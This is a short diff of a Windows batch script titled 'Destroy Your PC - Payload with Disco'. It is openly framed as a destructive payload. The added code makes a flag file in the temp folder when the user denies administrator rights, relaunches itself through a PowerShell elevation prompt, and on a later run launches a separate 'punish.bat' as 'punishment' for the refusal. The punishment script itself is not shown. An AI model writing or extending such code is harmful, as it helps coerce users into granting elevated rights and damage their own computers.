@@ -1,11 +1,21 @@
-:: === ADMIN CHECK ===
+:: === CHECK IF PUNISH FLAG EXISTS (top of script) ===
+if exist "%temp%\punish_flag.txt" (
+    echo Admin still denied, activating punishment...
+    start "" "%~dp0punish.bat"
+    exit
+)
 
+:: === ADMIN CHECK ===
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
-    echo [!] Admin rights required. Relaunching...
+    echo Admin not granted, setting flag and relaunching with admin prompt...
+    echo 1 > "%temp%\punish_flag.txt"
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit
 )
+
+:: === ADMIN GRANTED, REMOVE FLAG ===
+if exist "%temp%\punish_flag.txt" del "%temp%\punish_flag.txt"
 
 :: === VISUALS ===
 title Destroy Your PC - Payload with Disco
